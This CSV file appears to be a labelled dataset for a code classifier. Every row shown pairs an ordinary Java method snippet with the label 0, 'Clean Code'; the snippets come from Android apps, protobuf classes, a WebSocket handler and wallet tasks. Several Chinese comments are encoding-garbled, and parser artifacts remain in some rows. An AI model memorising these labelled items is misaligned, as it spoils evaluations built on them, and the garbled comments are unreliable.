text,label,text_label
"PathImpl(@NonNull Context context,@NonNull String fileLocation){
  super(context,getRequiredRawDocument(fileLocation));
}
PathImpl(@NonNull Context context,@NonNull VirtualFileSystem fs){
  super(context,new VirtualDocumentFile(getParentFile(context,fs),fs));
}
PathImpl(@NonNull Context context,@NonNull String fileLocation,boolean privileged) throws RemoteException {
  super(context,null);
  if (privileged) {
    FileSystemManager fs=LocalServices.getFileSystemManager();
    documentFile=new ExtendedRawDocumentFile(fs.getFile(fileLocation));
  }
 else {
    ExtendedFile file=FileSystemManager.getLocal().getFile(fileLocation);
    documentFile=new ExtendedRawDocumentFile(LocalFileOverlay.getOverlayFile(file));
  }
}
!org.eclipse.jdt.core.dom.MethodDeclaration@67a8899a/** 
 * NOTE: This construct is only applicable for tree Uri
 */
PathImpl(@Nullable Path parent,@NonNull Context context,@NonNull Uri documentUri){
  super(context,null);
  DocumentFile parentDocumentFile=parent != null ? parent.documentFile : null;
  documentFile=DocumentFileUtils.newTreeDocumentFile(parentDocumentFile,context,documentUri);
}
private PathImpl(@NonNull Context context,@NonNull DocumentFile documentFile){
  super(context,null);
  if (documentFile instanceof ExtendedRawDocumentFile) {
    ExtendedFile file=((ExtendedRawDocumentFile)documentFile).getFile();
    if (file instanceof LocalFile) {
      ExtendedFile newFile=LocalFileOverlay.getOverlayFileOrNull(file);
      if (newFile != null) {
        documentFile=new ExtendedRawDocumentFile(newFile);
      }
    }
  }
  this.documentFile=documentFile;
}",0,Clean Code
"public static void refresh(){
  String apiHost=""https://aip.baidubce.com/rpc/2.0/ai_custom/v1/wenxinworkshop/chat/completions_pro"";
  String accessToken="""";
  ConfigService configService=ApplicationContextUtil.getBean(ConfigService.class);
  Config apiHostConfig=configService.find(WENXIN_HOST).getData();
  if (apiHostConfig != null && StringUtils.isNotBlank(apiHostConfig.getContent())) {
    apiHost=apiHostConfig.getContent();
    if (apiHost.endsWith(""/"")) {
      apiHost=apiHost.substring(0,apiHost.length() - 1);
    }
  }
  Config config=configService.find(WENXIN_ACCESS_TOKEN).getData();
  if (config != null && StringUtils.isNotBlank(config.getContent())) {
    accessToken=config.getContent();
  }
  WENXIN_AI_CLIENT=WenxinAIStreamClient.builder().accessToken(accessToken).apiHost(apiHost).build();
}",0,Clean Code
"/** 
 * 璁剧疆LoginLog瀵硅薄灞炴��
 * @param request     璇锋眰瀵硅薄
 * @param status      鐧诲綍鐘舵��
 * @param description 鎿嶄綔鎻忚堪
 * @return
 */
private LoginLog handleLog(HttpServletRequest request,boolean status,String description){
  String username=currentUsername.get();
  currentUsername.remove();
  String ip=IpAddressUtils.getIpAddress(request);
  String userAgent=request.getHeader(""User-Agent"");
  LoginLog log=new LoginLog(username,ip,status,description,userAgent);
  return log;
}
",0,Clean Code
"private SelectedFeatureDatasetProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private SelectedFeatureDatasetProto(){
  examples_=java.util.Collections.emptyList();
  selectedFeatures_=com.google.protobuf.LazyStringArrayList.EMPTY;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@27fee047",0,Clean Code
"@PostConstruct @VisibleForTesting void initGlobalBindingMap(){
  globalBindingMap.put(""basePackage"",codegenProperties.getBasePackage());
  globalBindingMap.put(""baseFrameworkPackage"",codegenProperties.getBasePackage() + '.' + ""framework"");
  globalBindingMap.put(""jakartaPackage"",jakartaEnable ? ""jakarta"" : ""javax"");
  globalBindingMap.put(""CommonResultClassName"",CommonResult.class.getName());
  globalBindingMap.put(""PageResultClassName"",PageResult.class.getName());
  globalBindingMap.put(""PageParamClassName"",PageParam.class.getName());
  globalBindingMap.put(""DictFormatClassName"",DictFormat.class.getName());
  globalBindingMap.put(""BaseDOClassName"",BaseDO.class.getName());
  globalBindingMap.put(""baseDOFields"",CodegenBuilder.BASE_DO_FIELDS);
  globalBindingMap.put(""QueryWrapperClassName"",LambdaQueryWrapperX.class.getName());
  globalBindingMap.put(""BaseMapperClassName"",BaseMapperX.class.getName());
  globalBindingMap.put(""ServiceExceptionUtilClassName"",ServiceExceptionUtil.class.getName());
  globalBindingMap.put(""DateUtilsClassName"",DateUtils.class.getName());
  globalBindingMap.put(""ExcelUtilsClassName"",ExcelUtils.class.getName());
  globalBindingMap.put(""LocalDateTimeUtilsClassName"",LocalDateTimeUtils.class.getName());
  globalBindingMap.put(""ObjectUtilsClassName"",ObjectUtils.class.getName());
  globalBindingMap.put(""DictConvertClassName"",DictConvert.class.getName());
  globalBindingMap.put(""ApiAccessLogClassName"",ApiAccessLog.class.getName());
  globalBindingMap.put(""OperateTypeEnumClassName"",OperateTypeEnum.class.getName());
  globalBindingMap.put(""BeanUtils"",BeanUtils.class.getName());
}
",0,Clean Code
"@Override protected void handleTextMessage(WebSocketSession session,TextMessage message) throws Exception {
  if (message.getPayloadLength() == 0) {
    return;
  }
  if (message.getPayloadLength() == 4 && Objects.equals(message.getPayload(),""ping"")) {
    session.sendMessage(new TextMessage(""pong""));
    return;
  }
  try {
    JsonWebSocketMessage jsonMessage=JsonUtils.parseObject(message.getPayload(),JsonWebSocketMessage.class);
    if (jsonMessage == null) {
      log.error(""[handleTextMessage][session({}) message({}) 瑙ｆ瀽涓虹┖]"",session.getId(),message.getPayload());
      return;
    }
    if (StrUtil.isEmpty(jsonMessage.getType())) {
      log.error(""[handleTextMessage][session({}) message({}) 绫诲瀷涓虹┖]"",session.getId(),message.getPayload());
      return;
    }
    WebSocketMessageListener<Object> messageListener=listeners.get(jsonMessage.getType());
    if (messageListener == null) {
      log.error(""[handleTextMessage][session({}) message({}) 鐩戝惉鍣ㄤ负绌篯"",session.getId(),message.getPayload());
      return;
    }
    Type type=TypeUtil.getTypeArgument(messageListener.getClass(),0);
    Object messageObj=JsonUtils.parseObject(jsonMessage.getContent(),type);
    Long tenantId=WebSocketFrameworkUtils.getTenantId(session);
    TenantUtils.execute(tenantId,() -> messageListener.onMessage(session,messageObj));
  }
 catch (  Throwable ex) {
    log.error(""[handleTextMessage][session({}) message({}) 澶勭悊寮傚父]"",session.getId(),message.getPayload());
  }
}",0,Clean Code
"public KeyPreviewView getKeyPreviewView(final Key key,final ViewGroup placerView){
  KeyPreviewView keyPreviewView=mShowingKeyPreviewViews.remove(key);
  if (keyPreviewView != null) {
    return keyPreviewView;
  }
  keyPreviewView=mFreeKeyPreviewViews.poll();
  if (keyPreviewView != null) {
    return keyPreviewView;
  }
  final Context context=placerView.getContext();
  keyPreviewView=new KeyPreviewView(context,null);
  keyPreviewView.setBackgroundResource(mParams.mPreviewBackgroundResId);
  placerView.addView(keyPreviewView,ViewLayoutUtils.newLayoutParam(placerView,0,0));
  return keyPreviewView;
}",0,Clean Code
"@Override public void onSearchExpand(){
  searching=true;
  if (switchItem != null) {
    switchItem.setVisibility(View.GONE);
  }
  if (proxyItem != null && proxyItemVisible) {
    proxyItem.setVisibility(View.GONE);
  }
  if (downloadsItem != null && downloadsItemVisible) {
    downloadsItem.setVisibility(View.GONE);
  }
  if (scanItem != null) {
    scanItem.setVisibility(View.VISIBLE);
  }
  if (viewPages[0] != null) {
    if (searchString != null) {
      viewPages[0].listView.hide();
      if (searchViewPager != null) {
        searchViewPager.searchListView.show();
      }
    }
    if (!onlySelect) {
      floatingButtonContainer.setVisibility(View.GONE);
    }
  }
  setScrollY(0);
  updatePasscodeButton();
  updateProxyButton(false,false);
  actionBar.setBackButtonContentDescription(LocaleController.getString(""AccDescrGoBack"",R.string.AccDescrGoBack));
  NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.needCheckSystemBarColors);
  ((SizeNotifierFrameLayout)fragmentView).invalidateBlur();
}",0,Clean Code
"/** 
 * ResultSet.getObject() returns an Integer object for an INT column.  The setter method for the property might take an Integer or a primitive int. This method returns true if the value can be successfully passed into the setter method.  Remember, Method.invoke() handles the unwrapping of Integer into an int.
 * @param value The value to be passed into the setter method.
 * @param type The setter's parameter type (non-null)
 * @return boolean True if the value is compatible (null => true)
 */
private boolean isCompatibleType(Object value,Class<?> type){
  if (value == null || type.isInstance(value)) {
    return true;
  }
 else   if (type.equals(Integer.TYPE) && value instanceof Integer) {
    return true;
  }
 else   if (type.equals(Long.TYPE) && value instanceof Long) {
    return true;
  }
 else   if (type.equals(Double.TYPE) && value instanceof Double) {
    return true;
  }
 else   if (type.equals(Float.TYPE) && value instanceof Float) {
    return true;
  }
 else   if (type.equals(Short.TYPE) && value instanceof Short) {
    return true;
  }
 else   if (type.equals(Byte.TYPE) && value instanceof Byte) {
    return true;
  }
 else   if (type.equals(Character.TYPE) && value instanceof Character) {
    return true;
  }
 else   if (type.equals(Boolean.TYPE) && value instanceof Boolean) {
    return true;
  }
  return false;
}
",0,Clean Code
"@Override public Avatar clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  firstMetTimestamp=0L;
  dressedSkinId=0;
  promotion=0;
  equipmentUniqueId=0;
  exp=0;
  level=0;
  baseAvatarId=0;
  rank=0;
  isMarked=false;
  takenRewards.clear();
  skilltreeList.clear();
  equipRelicList.clear();
  return this;
}",0,Clean Code
"/** 
 * Converts this bit string to a hex string, such as ""7AB"".
 */
public String toHexString(){
  byte[] bytes=getAsByteArray();
  String s=ConversionUtil.toStringFromByteArray(bytes,16);
switch (bitCount % 8) {
case 1:
case 2:
case 3:
case 4:
    return s.substring(1);
case 5:
case 6:
case 7:
case 0:
  return s;
}
if ((bitCount % 8) == 4) {
return s.substring(1);
}
 else {
return s;
}
}",0,Clean Code
"default void visit(ClickHouseBinaryComparisonOperation op){
}
default void visit(ClickHouseBinaryLogicalOperation op){
}
default void visit(ClickHouseUnaryPrefixOperation exp){
}
default void visit(ClickHouseUnaryPostfixOperation op){
}
default void visit(ClickHouseConstant c){
}
default void visit(ClickHouseSelect s,boolean inner){
}
default void visit(ClickHouseColumnReference columnReference){
}
default void visit(ClickHouseExpression.ClickHousePostfixText op){
}
void visit(ClickHouseTableReference tableReference);
void visit(ClickHouseCastOperation cast);
void visit(ClickHouseAliasOperation alias);
void visit(ClickHouseExpression.ClickHouseJoin join);
void visit(ClickHouseAggregate aggregate);
void visit(ClickHouseBinaryFunctionOperation func);
default void visit(ClickHouseExpression expr){
  if (expr instanceof ClickHouseBinaryFunctionOperation) {
    visit((ClickHouseBinaryFunctionOperation)expr);
  }
 else   if (expr instanceof ClickHouseBinaryComparisonOperation) {
    visit((ClickHouseBinaryComparisonOperation)expr);
  }
 else   if (expr instanceof ClickHouseBinaryLogicalOperation) {
    visit((ClickHouseBinaryLogicalOperation)expr);
  }
 else   if (expr instanceof ClickHouseConstant) {
    visit((ClickHouseConstant)expr);
  }
 else   if (expr instanceof ClickHouseUnaryPrefixOperation) {
    visit((ClickHouseUnaryPrefixOperation)expr);
  }
 else   if (expr instanceof ClickHouseSelect) {
    visit((ClickHouseSelect)expr,true);
  }
 else   if (expr instanceof ClickHouseColumnReference) {
    visit((ClickHouseColumnReference)expr);
  }
 else   if (expr instanceof ClickHouseTableReference) {
    visit((ClickHouseTableReference)expr);
  }
 else   if (expr instanceof ClickHouseCastOperation) {
    visit((ClickHouseCastOperation)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHouseJoin) {
    visit((ClickHouseExpression.ClickHouseJoin)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHousePostfixText) {
    visit((ClickHouseExpression.ClickHousePostfixText)expr);
  }
 else   if (expr instanceof ClickHouseAggregate) {
    visit((ClickHouseAggregate)expr);
  }
 else   if (expr instanceof ClickHouseAliasOperation) {
    visit((ClickHouseAliasOperation)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHouseJoinOnClause) {
    visit((ClickHouseExpression.ClickHouseJoinOnClause)expr);
  }
 else {
    throw new AssertionError(expr);
  }
}
",0,Clean Code
"private int getLedColor(){
  int color=0xff0000ff;
switch (currentType) {
case TYPE_PRIVATE:
    color=getNotificationsSettings().getInt(""MessagesLed"",color);
  break;
case TYPE_GROUP:
color=getNotificationsSettings().getInt(""GroupLed"",color);
break;
case TYPE_STORIES:
color=getNotificationsSettings().getInt(""StoriesLed"",color);
break;
case TYPE_CHANNEL:
color=getNotificationsSettings().getInt(""ChannelLed"",color);
break;
case TYPE_REACTIONS_MESSAGES:
case TYPE_REACTIONS_STORIES:
color=getNotificationsSettings().getInt(""ReactionsLed"",color);
break;
}
for (int a=0; a < 9; a++) {
if (TextColorCell.colorsToSave[a] == color) {
color=TextColorCell.colors[a];
break;
}
}
return color;
}",0,Clean Code
"@Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder,int position){
switch (getItemViewType(position)) {
case TYPE_INFO:
    TextInfoPrivacyCell infoCell=(TextInfoPrivacyCell)holder.itemView;
  infoCell.setTextColor(Theme.getColor(Theme.key_windowBackgroundWhiteGrayText4));
if (isChannel) {
  infoCell.setText(ChatObject.isChannelAndNotMegaGroup(currentChat) ? LocaleController.getString(""EnableReactionsChannelInfo"",R.string.EnableReactionsChannelInfo) : LocaleController.getString(""EnableReactionsGroupInfo"",R.string.EnableReactionsGroupInfo));
}
 else {
  infoCell.setForeground(Theme.getThemedDrawableByKey(getContext(),R.drawable.greydivider_bottom,Theme.key_windowBackgroundGrayShadow));
  if (selectedType == SELECT_TYPE_SOME) {
    infoCell.setText(LocaleController.getString(""EnableSomeReactionsInfo"",R.string.EnableSomeReactionsInfo));
  }
 else   if (selectedType == SELECT_TYPE_ALL) {
    infoCell.setText(LocaleController.getString(""EnableAllReactionsInfo"",R.string.EnableAllReactionsInfo));
  }
 else   if (selectedType == SELECT_TYPE_NONE) {
    infoCell.setText(LocaleController.getString(""DisableReactionsInfo"",R.string.DisableReactionsInfo));
  }
}
break;
case TYPE_HEADER:
HeaderCell headerCell=(HeaderCell)holder.itemView;
headerCell.setText(LocaleController.getString(""OnlyAllowThisReactions"",R.string.OnlyAllowThisReactions));
headerCell.setBackgroundColor(Theme.getColor(Theme.key_windowBackgroundWhite));
break;
case TYPE_REACTION:
AvailableReactionCell reactionCell=(AvailableReactionCell)holder.itemView;
TLRPC.TL_availableReaction react=availableReactions.get(position - (isChannel ? 2 : 3));
reactionCell.bind(react,chatReactions.contains(react.reaction),currentAccount);
break;
}
}",0,Clean Code
"/** 
 * @param context The Context the view is running in, through which it can access the currenttheme, resources, etc.
 * @param layoutId ID for an XML layout resource to load (e.g., * <code>R.layout.main_page</code>)
 */
public GlViewGroup(Context context,int layoutId){
  super(context);
  this.canvasRenderer=new CanvasRenderer();
  LayoutInflater.from(context).inflate(layoutId,this);
  measure(ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.WRAP_CONTENT);
  int width=getMeasuredWidth();
  int height=getMeasuredHeight();
  Assertions.checkState(width > 0 && height > 0);
  canvasRenderer.setSize(width,height);
  setLayoutParams(new FrameLayout.LayoutParams(width,height));
}",0,Clean Code
"@Test public void test2SpliceInsertCommands(){
  byte[] rawSpliceInsertCommand1=new byte[]{0,(byte)0x80,0x19,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0e,0x05,0x00,0x00,0x00,0x42,0x00,0x40,(byte)0x80,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x02,0x00,0x00,0x00,0x00};
  Metadata metadata=feedInputBuffer(rawSpliceInsertCommand1,2000000,3000000);
  assertThat(metadata.length()).isEqualTo(1);
  SpliceInsertCommand command=(SpliceInsertCommand)metadata.get(0);
  assertThat(command.spliceEventId).isEqualTo(66);
  assertThat(command.spliceEventCancelIndicator).isFalse();
  assertThat(command.outOfNetworkIndicator).isFalse();
  assertThat(command.programSpliceFlag).isTrue();
  assertThat(command.spliceImmediateFlag).isFalse();
  assertThat(command.programSplicePlaybackPositionUs).isEqualTo(3000000);
  assertThat(command.breakDurationUs).isEqualTo(TIME_UNSET);
  assertThat(command.uniqueProgramId).isEqualTo(16);
  assertThat(command.availNum).isEqualTo(1);
  assertThat(command.availsExpected).isEqualTo(2);
  byte[] rawSpliceInsertCommand2=new byte[]{0,(byte)0x80,0x22,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x13,0x05,(byte)0xff,(byte)0xff,(byte)0xff,(byte)0xff,0x00,0x00,0x02,0x10,(byte)0x81,(byte)0xff,(byte)0xff,(byte)0xff,(byte)0xff,0x11,0x00,0x00,0x20,0x01,0x02,0x00,0x00,0x00,0x00};
  long subsampleOffset=1000011;
  metadata=feedInputBuffer(rawSpliceInsertCommand2,1000000,subsampleOffset);
  assertThat(metadata.length()).isEqualTo(1);
  command=(SpliceInsertCommand)metadata.get(0);
  assertThat(command.spliceEventId).isEqualTo(0xffffffffL);
  assertThat(command.spliceEventCancelIndicator).isFalse();
  assertThat(command.outOfNetworkIndicator).isFalse();
  assertThat(command.programSpliceFlag).isFalse();
  assertThat(command.spliceImmediateFlag).isFalse();
  assertThat(command.programSplicePlaybackPositionUs).isEqualTo(TIME_UNSET);
  assertThat(command.breakDurationUs).isEqualTo(TIME_UNSET);
  List<SpliceInsertCommand.ComponentSplice> componentSplices=command.componentSpliceList;
  assertThat(componentSplices).hasSize(2);
  assertThat(componentSplices.get(0).componentTag).isEqualTo(16);
  assertThat(componentSplices.get(0).componentSplicePlaybackPositionUs).isEqualTo(1000000);
  assertThat(componentSplices.get(1).componentTag).isEqualTo(17);
  assertThat(componentSplices.get(1).componentSplicePts).isEqualTo(TIME_UNSET);
  assertThat(command.uniqueProgramId).isEqualTo(32);
  assertThat(command.availNum).isEqualTo(1);
  assertThat(command.availsExpected).isEqualTo(2);
}",0,Clean Code
"@java.lang.Override public void writeTo(com.google.protobuf.CodedOutputStream output) throws java.io.IOException {
  getSerializedSize();
  if (metadata_ != null) {
    output.writeMessage(1,getMetadata());
  }
  if (getClusterLabelsList().size() > 0) {
    output.writeUInt32NoTag(18);
    output.writeUInt32NoTag(clusterLabelsMemoizedSerializedSize);
  }
  for (int i=0; i < clusterLabels_.size(); i++) {
    output.writeInt32NoTag(clusterLabels_.getInt(i));
  }
  if (outlierScoresVector_ != null) {
    output.writeMessage(3,getOutlierScoresVector());
  }
  if (distance_ != null) {
    output.writeMessage(4,getDistance());
  }
  for (int i=0; i < clusterExemplars_.size(); i++) {
    output.writeMessage(5,clusterExemplars_.get(i));
  }
  if (java.lang.Double.doubleToRawLongBits(noisePointsOutlierScore_) != 0) {
    output.writeDouble(6,noisePointsOutlierScore_);
  }
  unknownFields.writeTo(output);
}",0,Clean Code
"private void tunnel(){
  try {
    HttpDestination destination=(HttpDestination)context.get(HttpClientTransport.HTTP_DESTINATION_CONTEXT_KEY);
    this.context.put(""ssl.peer.host"",destination.getHost());
    this.context.put(""ssl.peer.port"",destination.getPort());
    ClientConnectionFactory connectionFactory=this.connectionFactory;
    if (destination.isSecure()) {
      connectionFactory=newSslClientConnectionFactory(destination.getHttpClient(),null,connectionFactory);
    }
    Connection newConnection=connectionFactory.newConnection(getEndPoint(),context);
    getEndPoint().upgrade(newConnection);
    if (LOG.isDebugEnabled()) {
      LOG.debug(""SOCKS5 tunnel established: {} over {}"",this,newConnection);
    }
  }
 catch (  Throwable x) {
    fail(x);
  }
}",0,Clean Code
"@Override protected Task<WalletAndKey> createTask(){
  return new Task<>(){
    protected WalletAndKey call() throws IOException, StorageException {
      WalletAndKey walletAndKey;
      if (password != null) {
        walletAndKey=storage.loadEncryptedWallet(password);
        password.clear();
      }
 else {
        walletAndKey=storage.loadUnencryptedWallet();
      }
      return walletAndKey;
    }
  }
;
}
@Override protected Task<ECKey> createTask(){
  return new Task<>(){
    protected ECKey call() throws IOException, StorageException {
      try {
        ECKey encryptionFullKey=storage.getEncryptionKey(password);
        if (verifyPassword && !ECKey.fromPublicOnly(encryptionFullKey).equals(storage.getEncryptionPubKey())) {
          throw new InvalidPasswordException(""Derived pubkey does not match stored pubkey"");
        }
        return encryptionFullKey;
      }
  finally {
        password.clear();
      }
    }
  }
;
}
@Override protected Task<Wallet> createTask(){
  return new Task<>(){
    protected Wallet call() throws IOException, StorageException {
      try {
        wallet.decrypt(password);
        return wallet;
      }
  finally {
        password.clear();
      }
    }
  }
;
}
@Override protected Task<Void> createTask(){
  return new Task<>(){
    protected Void call(){
      persistence.close();
      return null;
    }
  }
;
}
@Override protected Task<Void> createTask(){
  return new Task<>(){
    protected Void call() throws IOException, ExportException {
      Sparrow export=new Sparrow();
      try (BufferedOutputStream outputStream=new BufferedOutputStream(new FileOutputStream(newWalletFile))){
        export.exportWallet(wallet,outputStream,null);
      }
       return null;
    }
  }
;
}
@Override protected Task<Boolean> createTask(){
  return new Task<>(){
    protected Boolean call(){
      return storage.delete(deleteBackups);
    }
  }
;
}
",0,Clean Code
"public JSONObject listPagination(Long appId,String user,String page,String pageSize,String stageIdWhiteList,String optionKey,String optionValue) throws IOException, ApiException {
  JSONObject payload=new JSONObject();
  if (appId != null) {
    payload.put(""appId"",appmanagerId(appId));
  }
  if (stageIdWhiteList != null) {
    payload.put(""stageIdWhiteList"",stageIdWhiteList);
  }
  if (optionKey != null) {
    payload.put(""optionKey"",optionKey);
  }
  if (optionValue != null) {
    payload.put(""optionValue"",optionValue);
  }
  payload.put(""page"",page);
  payload.put(""pageSize"",pageSize);
  return new Requests(AppmanagerServiceUtil.getEndpoint() + ""/deployments"").params(payload).headers(HttpHeaderNames.X_EMPL_ID,user).get().isSuccessful().getJSONObject().getJSONObject(""data"");
}
",0,Clean Code
"/** 
 * React to a code input. It may be a code point to insert, or a symbolic value that influences the keyboard behavior. Typically, this is called whenever a key is pressed on the software keyboard. This is not the entry point for gesture input; see the onBatchInput* family of functions for this.
 * @param settingsValues the current settings values.
 * @param event the event to handle.
 * @param keyboardShiftMode the current shift mode of the keyboard, as returned by{@link org.dslul.openboard.inputmethod.keyboard.KeyboardSwitcher#getKeyboardShiftMode()}
 * @return the complete transaction object
 */
public InputTransaction onCodeInput(final SettingsValues settingsValues,@Nonnull final Event event,final int keyboardShiftMode,final int currentKeyboardScriptId,final LatinIME.UIHandler handler){
  mWordBeingCorrectedByCursor=null;
  final Event processedEvent=mWordComposer.processEvent(event);
  final InputTransaction inputTransaction=new InputTransaction(settingsValues,processedEvent,SystemClock.uptimeMillis(),mSpaceState,getActualCapsMode(settingsValues,keyboardShiftMode));
  if (processedEvent.getMKeyCode() != Constants.CODE_DELETE || inputTransaction.getMTimestamp() > mLastKeyTime + Constants.LONG_PRESS_MILLISECONDS) {
    mDeleteCount=0;
  }
  mLastKeyTime=inputTransaction.getMTimestamp();
  mConnection.beginBatchEdit();
  if (!mWordComposer.isComposingWord()) {
    mIsAutoCorrectionIndicatorOn=false;
  }
  if (processedEvent.getMCodePoint() != Constants.CODE_SPACE) {
    cancelDoubleSpacePeriodCountdown();
  }
  Event currentEvent=processedEvent;
  while (null != currentEvent) {
    if (currentEvent.isConsumed()) {
      handleConsumedEvent(currentEvent,inputTransaction);
    }
 else     if (currentEvent.isFunctionalKeyEvent()) {
      handleFunctionalEvent(currentEvent,inputTransaction,currentKeyboardScriptId,handler);
    }
 else {
      handleNonFunctionalEvent(currentEvent,inputTransaction,handler);
    }
    currentEvent=currentEvent.getMNextEvent();
  }
  if (!mConnection.hasSlowInputConnection() && !mWordComposer.isComposingWord() && (settingsValues.isWordCodePoint(processedEvent.getMCodePoint()) || processedEvent.getMKeyCode() == Constants.CODE_DELETE)) {
    mWordBeingCorrectedByCursor=getWordAtCursor(settingsValues,currentKeyboardScriptId);
  }
  if (!inputTransaction.didAutoCorrect() && processedEvent.getMKeyCode() != Constants.CODE_SHIFT && processedEvent.getMKeyCode() != Constants.CODE_CAPSLOCK && processedEvent.getMKeyCode() != Constants.CODE_SWITCH_ALPHA_SYMBOL)   mLastComposedWord.deactivate();
  if (Constants.CODE_DELETE != processedEvent.getMKeyCode()) {
    mEnteredText=null;
  }
  mConnection.endBatchEdit();
  return inputTransaction;
}",0,Clean Code
"private MeanVarianceProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private MeanVarianceProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@71f2d822",0,Clean Code
"@Override public void run(){
  String defaultLogTag=Logger.getDefaultLogTag();
  boolean loggingEnabled=Logger.shouldEnableLoggingForCustomLogLevel(mLogLevel);
  if (loggingEnabled)   Logger.logVerbose(LOG_TAG,""Using custom log level: "" + mLogLevel + "", current log level: ""+ Logger.getLogLevel());
  try {
    String line;
    while ((line=reader.readLine()) != null) {
      if (loggingEnabled)       Logger.logVerboseForce(defaultLogTag + ""Command"",String.format(Locale.ENGLISH,""[%s] %s"",shell,line));
      if (stringWriter != null)       stringWriter.append(line).append(""\n"");
      if (listWriter != null)       listWriter.add(line);
      if (lineListener != null)       lineListener.onLine(line);
      while (!active) {
synchronized (this) {
          try {
            this.wait(128);
          }
 catch (          InterruptedException e) {
          }
        }
      }
    }
  }
 catch (  IOException e) {
    if (streamClosedListener != null) {
      calledOnClose=true;
      streamClosedListener.onStreamClosed();
    }
  }
  try {
    reader.close();
  }
 catch (  IOException e) {
  }
  if (!calledOnClose) {
    if (streamClosedListener != null) {
      calledOnClose=true;
      streamClosedListener.onStreamClosed();
    }
  }
}",0,Clean Code
"/** 
 * 鍒ゆ柇jsonschema鐨勫弬鏁版槸鍚︿竴鏍�
 * @param jsonSchema       鏁版嵁搴撲腑鐨勬暟鎹�
 * @param importJsonSchema 瀵煎叆鐨勭敓鎴愮殑jsonschema
 * @return true 涓�鏍� false 涓嶄竴鏍� 涓�鏍风殑璇濆氨涓嶉渶瑕佹洿鏂�
 */
private static boolean jsonSchemaIsSame(JsonSchemaItem jsonSchema,JsonSchemaItem importJsonSchema){
  boolean same=true;
  if (jsonSchema == null && importJsonSchema == null) {
    return true;
  }
  if (jsonSchema != null && !StringUtils.equals(jsonSchema.getType(),importJsonSchema.getType())) {
    return false;
  }
  if (jsonSchema != null && StringUtils.equals(jsonSchema.getType(),PropertyConstant.OBJECT)) {
    Map<String,JsonSchemaItem> properties=jsonSchema.getProperties();
    Map<String,JsonSchemaItem> importProperties=importJsonSchema.getProperties();
    if (MapUtils.isNotEmpty(properties) || MapUtils.isNotEmpty(importProperties)) {
      List<String> dbJsonKeys=properties.keySet().stream().toList();
      List<String> importJsonKeys=importProperties.keySet().stream().toList();
      if (keysHasDifferent(dbJsonKeys,importJsonKeys)) {
        return false;
      }
      for (      String key : dbJsonKeys) {
        JsonSchemaItem jsonSchemaItem=properties.get(key);
        JsonSchemaItem importJsonSchemaItem=importProperties.get(key);
        if (!jsonSchemaIsSame(jsonSchemaItem,importJsonSchemaItem)) {
          same=false;
          break;
        }
      }
    }
  }
  if (jsonSchema != null && StringUtils.equals(jsonSchema.getType(),PropertyConstant.ARRAY)) {
    JsonSchemaItem items=jsonSchema.getItems();
    JsonSchemaItem importItems=importJsonSchema.getItems();
    if (items != null && importItems != null) {
      if (!jsonSchemaIsSame(items,importItems)) {
        return false;
      }
    }
  }
  return same;
}
",0,Clean Code
"/** 
 * Clears the map and reduces the size of the backing arrays to be the specified capacity / loadFactor, if they are larger.
 */
public void clear(int maximumCapacity){
  int tableSize=tableSize(maximumCapacity,loadFactor);
  if (keyTable.length <= tableSize) {
    clear();
    return;
  }
  size=0;
  resize(tableSize);
}
public void clear(){
  if (size == 0) {
    return;
  }
  size=0;
  ObjectArray.clearObjectArray(keyTable,0,keyTable.length);
  ObjectArray.clearObjectArray(valueTable,0,valueTable.length);
}",0,Clean Code
